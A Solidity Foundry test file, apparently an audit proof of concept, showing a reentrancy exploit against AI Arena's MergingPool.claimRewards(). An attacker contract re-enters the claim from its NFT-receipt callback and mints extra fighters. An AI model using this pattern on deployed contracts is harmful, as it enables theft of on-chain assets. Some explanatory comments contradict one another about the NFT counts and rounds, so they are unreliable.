// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {FighterFarm} from "../../src/FighterFarm.sol";
import {Neuron} from "../../src/Neuron.sol";
import {AAMintPass} from "../../src/AAMintPass.sol";
import {MergingPool} from "../../src/MergingPool.sol";
import {RankedBattle} from "../../src/RankedBattle.sol";
import {VoltageManager} from "../../src/VoltageManager.sol";
import {GameItems} from "../../src/GameItems.sol";
import {AiArenaHelper} from "../../src/AiArenaHelper.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/**
 * @title ReentrancyExploitTest
 * @notice Demonstrates a reentrancy vulnerability in MergingPool.claimRewards()
 *
 * VULNERABILITY DESCRIPTION:
 * The claimRewards function is vulnerable to reentrancy attacks because:
 * 1. It updates numRoundsClaimed[msg.sender] inside the loop (line 150)
 * 2. It makes an external call to mintFromMergingPool before the loop completes (line 154)
 * 3. A malicious contract can reenter claimRewards during the ERC721 callback
 * 4. The reentrant call sees the same roundId and can claim additional NFTs
 *
 * ATTACK FLOW:
 * - Round 0 completes, Alice (malicious contract) wins 1 NFT
 * - Round 1 completes, Alice wins 1 NFT again (total: 2 NFTs owed)
 * - Alice calls claimRewards with 2 sets of parameters
 * - First iteration: numRoundsClaimed = 1, mints NFT, triggers onERC721Received
 * - Reentrancy: Alice calls claimRewards again while still in first call
 * - Second call processes both rounds again because numRoundsClaimed was only partially updated
 * - Result: Alice receives 4 NFTs instead of 2
 *
 * ROOT CAUSE:
 * The numRoundsClaimed state variable is incremented before the external call,
 * but the loop continues after the call. During reentrancy, the inner call
 * completes fully before the outer call resumes, allowing double claiming.
 */
contract ReentrancyExploitTest is Test {
    /*//////////////////////////////////////////////////////////////
                                CONSTANTS
    //////////////////////////////////////////////////////////////*/

    uint8[][] internal _probabilities;
    address internal constant _DELEGATED_ADDRESS = 0x22F4441ad6DbD602dFdE5Cd8A38F6CAdE68860b0;
    address internal _ownerAddress;
    address internal _treasuryAddress;
    address internal _neuronContributorAddress;

    /*//////////////////////////////////////////////////////////////
                             CONTRACT INSTANCES
    //////////////////////////////////////////////////////////////*/

    FighterFarm internal _fighterFarmContract;
    AAMintPass internal _mintPassContract;
    MergingPool internal _mergingPoolContract;
    RankedBattle internal _rankedBattleContract;
    VoltageManager internal _voltageManagerContract;
    GameItems internal _gameItemsContract;
    AiArenaHelper internal _helperContract;
    Neuron internal _neuronContract;

    MaliciousWinner internal _maliciousContract;

    function getProb() public {
        _probabilities.push([25, 25, 13, 13, 9, 9]);
        _probabilities.push([25, 25, 13, 13, 9, 1]);
        _probabilities.push([25, 25, 13, 13, 9, 10]);
        _probabilities.push([25, 25, 13, 13, 9, 23]);
        _probabilities.push([25, 25, 13, 13, 9, 1]);
        _probabilities.push([25, 25, 13, 13, 9, 3]);
    }

    /*//////////////////////////////////////////////////////////////
                                SETUP
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        _ownerAddress = address(this);
        _treasuryAddress = vm.addr(1);
        _neuronContributorAddress = vm.addr(2);
        getProb();

        _fighterFarmContract = new FighterFarm(_ownerAddress, _DELEGATED_ADDRESS, _treasuryAddress);

        _helperContract = new AiArenaHelper(_probabilities);

        _mintPassContract = new AAMintPass(_ownerAddress, _DELEGATED_ADDRESS);
        _mintPassContract.setFighterFarmAddress(address(_fighterFarmContract));
        _mintPassContract.setPaused(false);

        _gameItemsContract = new GameItems(_ownerAddress, _treasuryAddress);

        _voltageManagerContract = new VoltageManager(_ownerAddress, address(_gameItemsContract));

        _neuronContract = new Neuron(_ownerAddress, _treasuryAddress, _neuronContributorAddress);

        _rankedBattleContract = new RankedBattle(
            _ownerAddress, address(_fighterFarmContract), _DELEGATED_ADDRESS, address(_voltageManagerContract)
        );

        _rankedBattleContract.instantiateNeuronContract(address(_neuronContract));

        _mergingPoolContract =
            new MergingPool(_ownerAddress, address(_rankedBattleContract), address(_fighterFarmContract));

        _fighterFarmContract.setMergingPoolAddress(address(_mergingPoolContract));
        _fighterFarmContract.instantiateAIArenaHelperContract(address(_helperContract));
        _fighterFarmContract.instantiateMintpassContract(address(_mintPassContract));
        _fighterFarmContract.instantiateNeuronContract(address(_neuronContract));
        _fighterFarmContract.setMergingPoolAddress(address(_mergingPoolContract));

        // Deploy malicious contract
        _maliciousContract = new MaliciousWinner(_mergingPoolContract, _fighterFarmContract);
    }

    /*//////////////////////////////////////////////////////////////
                            EXPLOIT TEST
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Test demonstrating reentrancy vulnerability in claimRewards
     * @dev This test shows that a malicious contract can claim more NFTs than entitled
     *
     * EXPECTED BEHAVIOR: Alice should receive 4 NFTs (2 per round, 2 rounds)
     * ACTUAL BEHAVIOR: Alice receives 6 NFTs due to reentrancy
     *
     * TEST STEPS:
     * 1. Mint initial fighter to establish token ID
     * 2. Set up 2 rounds where malicious contract wins twice per round
     * 3. Malicious contract claims rewards with reentrancy attack
     * 4. Verify that 6 NFTs were minted instead of 4
     *
     * REENTRANCY FLOW (with roundId = 2, 2 wins per round):
     * - Initial call: lowerBound=0, processes rounds 0,1
     * - Round 0, win 1: numRoundsClaimed=1, mints NFT #1, triggers reentrancy
     *   - Reentrant call: lowerBound=1, processes round 1
     *     - Round 1, win 1: numRoundsClaimed=2, mints NFT #2
     *     - Round 1, win 2: numRoundsClaimed=2, mints NFT #3
     *   - Reentrant call completes (2 mints)
     * - Back to initial call, continues:
     *   - Round 0, win 2: numRoundsClaimed=3, mints NFT #4
     *   - Round 1, win 1: numRoundsClaimed=4, mints NFT #5
     *   - Round 1, win 2: numRoundsClaimed=4, mints NFT #6
     * - Total: 6 NFTs instead of 4 (2 extra NFTs stolen)
     */
    function testReentrancyExploit() public {
        // Step 1: Mint initial fighter to the malicious contract
        _mintFromMergingPool(address(_maliciousContract));

        // Verify initial state
        assertEq(_fighterFarmContract.ownerOf(0), address(_maliciousContract));
        assertEq(_fighterFarmContract.balanceOf(address(_maliciousContract)), 1);

        // Step 2: Set up 2 rounds where malicious contract wins TWICE per round
        // Since we pass [0, 0], the same address appears twice in winnerAddresses
        // This means 2 NFTs per round, 4 total legitimate NFTs
        // With reentrancy, it will get 6 NFTs total (1 initial + 6 = 7, within MAX_FIGHTERS_ALLOWED)
        // Round 0
        uint256[] memory winners0 = new uint256[](2);
        winners0[0] = 0; // Malicious contract's fighter
        winners0[1] = 0; // Same fighter - address appears twice in winnerAddresses
        _mergingPoolContract.pickWinner(winners0);
        assertEq(_mergingPoolContract.roundId(), 1);

        // Round 1
        uint256[] memory winners1 = new uint256[](2);
        winners1[0] = 0; // Malicious contract's fighter
        winners1[1] = 0; // Same fighter
        _mergingPoolContract.pickWinner(winners1);
        assertEq(_mergingPoolContract.roundId(), 2);

        // Step 3: Check unclaimed rewards before attack
        uint256 unclaimedBefore = _mergingPoolContract.getUnclaimedRewards(address(_maliciousContract));
        console.log("Unclaimed rewards:", unclaimedBefore);
        assertEq(unclaimedBefore, 4, "Should have 4 unclaimed rewards (2 per round, 2 rounds)");

        // Record balance before claiming
        uint256 balanceBefore = _fighterFarmContract.balanceOf(address(_maliciousContract));
        console.log("Balance before claiming:", balanceBefore);

        // Step 4: Execute the reentrancy attack
        _maliciousContract.executeReentrancyAttack();

        // Step 5: Verify the exploit succeeded
        uint256 balanceAfter = _fighterFarmContract.balanceOf(address(_maliciousContract));
        console.log("Balance after claiming:", balanceAfter);

        // VULNERABILITY PROOF:
        // Expected: balanceAfter = balanceBefore + 4 (legitimate claims: 2 per round Ã— 2 rounds)
        // Actual: balanceAfter = balanceBefore + 6 (extra NFTs from reentrancy)
        uint256 nftsMinted = balanceAfter - balanceBefore;
        console.log("NFTs minted:", nftsMinted);

        // With reentrancy on first mint of round 0:
        // Round 0 first mint -> reenter -> claim round 1 (2 NFTs) -> return -> finish round 0 + round 1 again (3 more) = 6 total
        // The malicious contract should have received MORE than 4 NFTs due to reentrancy
        assertGt(nftsMinted, 4, "Reentrancy attack failed - should mint more than 4 NFTs");
        assertEq(nftsMinted, 6, "Should mint exactly 6 NFTs due to reentrancy (4 legitimate + 2 extra)");
    }

    /*//////////////////////////////////////////////////////////////
                               HELPERS
    //////////////////////////////////////////////////////////////*/

    /// @notice Helper function to mint a fighter NFT to an address
    function _mintFromMergingPool(address to) internal {
        vm.prank(address(_mergingPoolContract));
        _fighterFarmContract.mintFromMergingPool(to, "_neuralNetHash", "original", [uint256(1), uint256(80)]);
    }

    /// @notice Required to receive ERC721 tokens
    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

/**
 * @title MaliciousWinner
 * @notice Malicious contract that exploits reentrancy in MergingPool.claimRewards()
 *
 * ATTACK MECHANISM:
 * This contract implements IERC721Receiver to intercept NFT transfers.
 * When it receives an NFT during claimRewards, it reenters the function
 * to claim additional NFTs before the original call completes.
 */
contract MaliciousWinner is IERC721Receiver {
    MergingPool public mergingPool;
    FighterFarm public fighterFarm;
    bool public attacking;
    uint256 public reentrancyCount;

    constructor(MergingPool _mergingPool, FighterFarm _fighterFarm) {
        mergingPool = _mergingPool;
        fighterFarm = _fighterFarm;
        attacking = false;
        reentrancyCount = 0;
    }

    /**
     * @notice Initiates the reentrancy attack
     * @dev Prepares attack parameters and calls claimRewards
     *
     * ATTACK PARAMETERS:
     * - Outer call will use claimIndex 0, 1, 2, 3 (round 0: 2 wins, round 1: 2 wins)
     * - We provide 4 parameters for the outer call
     */
    function executeReentrancyAttack() external {
        attacking = true;
        reentrancyCount = 0;

        // Prepare claim parameters for 4 NFTs (outer call needs 4 indices: 0,1,2,3)
        string[] memory modelURIs = new string[](4);
        string[] memory modelTypes = new string[](4);
        uint256[2][] memory customAttributes = new uint256[2][](4);

        for (uint256 i = 0; i < 4; i++) {
            modelURIs[i] = "model";
            modelTypes[i] = "original";
            customAttributes[i] = [uint256(1), uint256(80)];
        }

        // Execute the attack
        mergingPool.claimRewards(modelURIs, modelTypes, customAttributes);

        attacking = false;
    }

    /**
     * @notice ERC721 receiver callback - triggers reentrancy
     * @dev This function is called when an NFT is transferred to this contract
     *
     * REENTRANCY LOGIC:
     * - First NFT received: Reenter claimRewards to claim again
     * - Subsequent NFTs: Accept without reentering to avoid infinite loop
     * - The single reentrancy is enough to double the NFT claims
     */
    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes memory
    ) external override returns (bytes4) {
        // Only reenter once to avoid infinite loop
        // One reentrancy is sufficient to demonstrate the vulnerability
        if (attacking && reentrancyCount == 0) {
            reentrancyCount++;

            console.log("Reentering claimRewards during NFT transfer of token:", tokenId);

            // Reenter with enough parameters for the remaining claims
            // At this point, numRoundsClaimed = 1, so we'll process rounds 1 and 2
            // That's 2 more NFTs, using claimIndex 0 and 1
            string[] memory modelURIs = new string[](2);
            string[] memory modelTypes = new string[](2);
            uint256[2][] memory customAttributes = new uint256[2][](2);

            for (uint256 i = 0; i < 2; i++) {
                modelURIs[i] = "model_reentry";
                modelTypes[i] = "original";
                customAttributes[i] = [uint256(1), uint256(80)];
            }

            // CRITICAL: This reentrant call will process rounds 1 and 2
            // Then when we return, the outer call will ALSO process rounds 1 and 2
            // This causes the double-claim vulnerability
            mergingPool.claimRewards(modelURIs, modelTypes, customAttributes);
        }

        return this.onERC721Received.selector;
    }
}
